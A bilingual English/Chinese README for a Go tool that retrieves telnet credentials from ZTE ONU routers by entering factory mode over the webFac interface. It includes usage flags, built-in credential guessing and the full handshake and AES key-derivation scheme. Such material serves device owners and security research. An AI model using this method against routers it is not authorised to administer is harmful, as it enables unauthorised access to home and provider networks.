# zte_onu

<details name="lang" open>
<summary><b>English</b> — click to collapse</summary>

## Overview

Retrieves credentials from ZTE ONUs through a five-step handshake over the device's `webFac` interface, entering factory mode to obtain a username and password usable for telnet login. It auto-detects the core type (A / B / C / M) and picks the matching key pool and payload format, using only the Go standard library.

Build: `go build -o zte_onu .`; for Windows `CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -trimpath -ldflags '-s -w' -o zte_onu.exe .`; `./build.sh 1.0.0` builds all seven targets. Statically linked — copy the binary and run.

The tool only retrieves credentials; it does not enable telnet. Use only on devices you are authorized to administer.

## Usage

```
zte_onu -m <LOCAL_MAC> [options] <DEVICE_IP>
```

`-m` is required and must be the **local NIC** MAC, not the ONU's.

| Flag | Default | Description |
|---|---|---|
| `-m` | required | Local MAC, `XX:XX:XX:XX:XX:XX` (dashes also accepted) |
| `-ip` | positional | Device IP; may also be given as the trailing argument |
| `-port` | `8080` | Device port |
| `-u` `-user` | 4 built-in | Username(s), multiple via `-u "a b c"` |
| `-p` `-pass` | 4 built-in | Password(s), same syntax |
| `-slaveip` | none | Append `&slaveip=<ip>` to step 5 (slave ONU) |
| `-close` | off | Step 5 sends the close payload instead of enable |
| `-all` | off | Try every credential pair, do not stop at first hit |
| `-v` | off | Print per-step detail |

```bash
zte_onu -m 00:11:22:33:44:55 192.168.1.1                       # built-in credentials
zte_onu -m 00:11:22:33:44:55 -u telecomadmin -p admin123 192.168.1.1
zte_onu -m 00:11:22:33:44:55 -u "a b c" -p "p1 p2 p3" 192.168.1.1
zte_onu -m 00:11:22:33:44:55 -slaveip 192.168.2.9 192.168.1.1  # slave ONU
```

## Output

```
[1/4] user=telecomadmin pass=testpw -> OK  1:OK 2:OK 3:OK 4:OK 5:OK  核心=B seed=40
Hit: user=telecomadmin pass=testpw -> user=sup3r  pass=s3cr3tPW
```

The `user=` / `pass=` on the `Hit:` line are the device credentials — log in with your own telnet client.

Troubleshooting: `step4=401` usually means wrong credentials, `400` usually means a stale state (just rerun). Add `-v` for detail.

## Handshake

| Step | Path | Plaintext |
|---|---|---|
| reset | `/webFac` | `SendSq.gch` (400 expected) |
| 1 | `/webFac` | `RequestFactoryMode.gch` |
| 2 | `/webFac` | `SendSq.gch?rand=N` |
| 3 | `/webFacEntry` | `SendInfo.gch?info=N\|...` |
| 4 | `/webFacEntry` | `CheckLoginAuth.gch?...` |
| 5 | `/webFacEntry` | `FactoryMode.gch?mode=2&user=notused` |

The last three are AES-192 ECB ciphertext. A step-2 response containing `re_rand=`, `newrand=` or `mipsrand=` selects core C, B or M respectively; none of them means core A.

Key derivation: `seed = ((rand60 × 0x1000193) % 64 XOR atoi(field)) % 60`, then `key = pool[seed:seed+24]` with each byte XOR `0xA5`.

Requires Go 1.18+. 

</details>

<details name="lang">
<summary><b>中文</b> — 点击展开</summary>

## 简介

通过设备 `webFac` 接口完成五步握手，进入工厂模式后取回可用于 telnet 登录的账号密码。程序自动识别设备核心类型，选用对应密钥池与载荷格式，只用 Go 标准库。

编译：`go build -o zte_onu .`；Windows 用 `CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -trimpath -ldflags '-s -w' -o zte_onu.exe .`；`./build.sh 1.0.0` 一次编出 7 个平台。静态链接，拷过去直接跑。

工具只取回凭据，不代为开启 telnet。请仅在你有管理权限的设备上使用。

## 用法

```
zte_onu -m <本机MAC> [选项] <设备IP>
```

`-m` 必填，填**本机网卡** MAC（不是光猫的）。

| 参数 | 默认 | 说明 |
|---|---|---|
| `-m` | 必填 | 本机 MAC，`XX:XX:XX:XX:XX:XX`（横杠也可） |
| `-ip` | 位置参数 | 设备 IP，也可直接写在末尾 |
| `-port` | `8080` | 设备端口 |
| `-u` `-user` | 内置 4 个 | 用户名，多个用 `-u "a b c"` |
| `-p` `-pass` | 内置 4 个 | 密码，同上 |
| `-slaveip` | 无 | step5 追加 `&slaveip=<ip>`（从光猫） |
| `-close` | 关 | step5 发关闭明文 |
| `-all` | 关 | 试完所有组合，不早停 |
| `-v` | 关 | 打印每步明细 |

```bash
zte_onu -m 00:11:22:33:44:55 192.168.1.1                          # 内置凭据批量试
zte_onu -m 00:11:22:33:44:55 -u telecomadmin -p admin123 192.168.1.1
zte_onu -m 00:11:22:33:44:55 -u "a b c" -p "p1 p2 p3" 192.168.1.1
zte_onu -m 00:11:22:33:44:55 -slaveip 192.168.2.9 192.168.1.1      # 从光猫
```

## 输出

```
[1/4] user=telecomadmin pass=testpw -> OK  1:OK 2:OK 3:OK 4:OK 5:OK  核心=B seed=40
Hit: user=telecomadmin pass=testpw -> user=sup3r  pass=s3cr3tPW
```

`Hit:` 行的 `user=` / `pass=` 即设备凭据，用 telnet 客户端自行登录。

排查：`step4=401` 多为账号密码不对，`400` 多为 state 不对（重跑一次）。加 `-v` 看明细。

## 握手流程

| 步 | 路径 | 明文 |
|---|---|---|
| reset | `/webFac` | `SendSq.gch`（期望 400） |
| 1 | `/webFac` | `RequestFactoryMode.gch` |
| 2 | `/webFac` | `SendSq.gch?rand=N` |
| 3 | `/webFacEntry` | `SendInfo.gch?info=N\|...` |
| 4 | `/webFacEntry` | `CheckLoginAuth.gch?...` |
| 5 | `/webFacEntry` | `FactoryMode.gch?mode=2&user=notused` |

后三步为 AES-192 ECB 密文。step2 响应含 `re_rand=` / `newrand=` / `mipsrand=` 分别对应核心 C / B / M，都没有则为 A。

密钥：`seed = ((rand60 × 0x1000193) % 64 XOR atoi(field)) % 60`，`key = pool[seed:seed+24]` 逐字节 XOR `0xA5`。

需要 Go 1.18+。

</details>
